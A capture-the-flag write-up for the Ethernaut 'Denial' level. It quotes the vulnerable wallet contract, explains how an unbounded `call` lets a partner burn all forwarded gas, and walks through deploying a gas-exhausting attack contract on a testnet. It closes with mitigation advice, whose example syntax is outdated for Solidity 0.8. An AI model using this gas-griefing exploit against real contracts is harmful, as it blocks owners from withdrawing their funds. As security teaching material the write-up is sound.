# 20 - Denial

## Challenge

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## Summary

This level is about understanding how the `call` function works, and how it can be used to deny the owner from withdrawing funds. With experience from past levels, we can instantly spot the vulnerability: `withdraw()` does not detect and disallow execution of some unknown external contract code through `call` method.

Since we want `withdraw()` to be reverted, we also notice that `call` did not set a gas limit that external call can use, this allows us to consume all gas in some `receive` of attack contract.

So what function we choose to burn all the gas? I searched online and found out we can use a for loop and increase some variable indefinitely. This will consume all gas and revert the transaction.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0x41F06bb6144DBd54A216B599e26Fc550Bdb2C70C'
```

Deploy the attack contract:

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    uint256 n;

    receive() external payable {
        while (gasleft() > 0) {
            n += 1;
        }
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['Attack']
>>> attackContract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> attackContract.deploy(contract_addr)
2023-06-29 22:11:09.749 | DEBUG    | cheb3.contract:deploy:94 - Deploying contract ...
2023-06-29 22:11:15.036 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0x85ad7Af1b3ce9E562c814B5a45a359Cb4Eb13d52
```

Now we just set `partner`:

```js
> await contract.setWithdrawPartner("0x85ad7Af1b3ce9E562c814B5a45a359Cb4Eb13d52")
```

Finally, submit the instance to pass the level.

## Afterword

This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.

Typically one should follow the [checks-effects-interactions](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.